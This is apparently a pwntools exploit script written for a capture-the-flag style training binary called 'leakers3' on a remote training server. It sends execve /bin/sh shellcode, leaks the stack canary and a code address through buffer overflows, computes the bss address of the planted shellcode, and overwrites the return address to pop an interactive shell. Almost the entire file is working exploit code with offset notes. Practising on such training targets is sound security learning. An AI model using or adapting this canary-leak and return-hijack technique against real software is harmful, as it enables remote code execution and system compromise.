from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

import time

#r = process("./leakers3") 
r = remote("bin.training.jinblack.it", 2012)



'''
gdb.attach(r, """
	#brva 0xa13
	#brva 0xa45
	brva 0xa6a
	c
""")
'''


shellcode = b"\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00"
r.send(shellcode)
time.sleep(1)

#payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac'
payload = b"B" * 105
r.send(payload)
time.sleep(1)

r.recvuntil(b"> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("canary: " + "%#x" % canary)

payload_to_leak_the_main = b"C" * (104 + 6*8)
r.send(payload_to_leak_the_main)
time.sleep(1)

r.recvuntil(b"> ")
r.recv(104 + 6*8)
main_b = r.recv(6) + b"\x00" * 2
main = u64(main_b)
offset_main = 0x960
offset_protection = main - offset_main
#print("offset : " + "%#x" % offset_protection)
print("address on main: " + "%#x" % main)

# ps1 is in the section bss which should not be randomized by aslr
# looking in ghidra the offset from the bss base is 0x20
# however we don't have a real leak of bss, but we can exploit the one from main 
# notice that if you compute "info files" in gdb, it gives back the sections
# the base of bcc starts from 0x555555755060 and the leak is 0x555555554960
# 0x555555755060 - 0x555555554960 = 0x200700
offset_main_bss = 0x200700
offset_bss_ps1 = 0x20
ps1 = main + offset_main_bss + offset_bss_ps1
#print("ps1: " + "%#x" % ps1)

payload = b"B" * 104 + p64(canary) + b"D"*8 + p64(ps1)
r.send(payload)
time.sleep(1)

payload = b"\n"
r.send(payload)
time.sleep(1)

r.interactive()
input("wait")

